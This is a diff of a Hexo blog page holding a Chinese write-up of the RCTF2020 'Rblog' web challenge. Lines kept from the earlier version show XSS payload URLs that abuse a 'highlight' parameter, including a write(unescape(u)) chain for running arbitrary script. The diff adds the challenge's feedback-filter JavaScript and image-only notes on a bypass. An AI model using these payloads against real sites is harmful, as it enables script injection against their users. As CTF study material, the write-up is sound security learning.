@@ -136,7 +136,10 @@
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197197.jpg">
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197203.jpg">
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197211.jpg">
-<meta property="og:updated_time" content="2020-06-01T02:37:23.753Z">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953331.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953340.jpg">
+<meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953348.jpg">
+<meta property="og:updated_time" content="2020-06-01T03:15:32.879Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF2020 Rblog WriteUp">
 <meta name="twitter:image" content="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197138.jpg">
@@ -434,7 +437,7 @@
                 
               
 
-              <time title="Created: 2020-06-01 10:00:00 / Modified: 10:37:23" itemprop="dateCreated datePublished" datetime="2020-06-01T10:00:00+08:00">2020-06-01</time>
+              <time title="Created: 2020-06-01 10:00:00 / Modified: 11:15:32" itemprop="dateCreated datePublished" datetime="2020-06-01T10:00:00+08:00">2020-06-01</time>
             
 
             
@@ -517,7 +520,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=(.)|$1svg/onload=alert(1)+</span><br></pre></td></tr></table></figure>
 <p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909777197211.jpg" alt="-w1040"></p>
 <p>漏洞利用：通过<code>write(unescape(u))</code>来写入当前url来进行任意代码执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=[$`style onload=write(unescape(u)) ]#?highlight=&lt;script&gt;alert(1)&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure></p>
-<p>膜hpdoger!!!</p>
+<p><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953331.jpg" alt=""></p>
+<p><a href="https://blog.cal1.cn/" target="_blank" rel="noopener">官方解法</a>里还有几个有意思的点：<br>在feedback提交给管理员不能用<code>/</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    axios.get(<span class="string">'?fetch'</span>).then(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> resp.data) &#123;</span><br><span class="line">            <span class="keyword">let</span> params = <span class="keyword">new</span> URLSearchParams()</span><br><span class="line">            params.set(<span class="string">'highlight'</span>, i.highlight_word)</span><br><span class="line">            <span class="keyword">if</span> (i.link.includes(<span class="string">'/'</span>) || i.link.includes(<span class="string">'\\'</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">// bye bye hackers uwu</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">            a.href = <span class="string">`<span class="subst">$&#123;i.link&#125;</span>?<span class="subst">$&#123;params.toString()&#125;</span>`</span></span><br><span class="line">            a.text = <span class="string">`<span class="subst">$&#123;i.ip&#125;</span>: <span class="subst">$&#123;a.href&#125;</span>`</span></span><br><span class="line">            feedback_list.appendChild(a)</span><br><span class="line">            feedback_list.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'br'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        feedback_list.innerHTML = DOMPurify.sanitize(feedback_list.innerHTML)</span><br><span class="line">    &#125;, err =&gt; &#123;</span><br><span class="line">        feedback_list.innerText = err</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>bypass:<br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953340.jpg" alt=""><br><img src="http://static-passer6y.d0g3.cn/0day/2020-06-01-15909812953348.jpg" alt="-w936"></p>
+<p>膜hpdoger!!! 膜出题人</p>
 
       
     </div>
@@ -839,7 +845,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共89.1k字</span>
+  <span class="post-count">博客全站共89.2k字</span>
 </div>
 
 <span id="busuanzi_container_site_pv" class="theme-info">
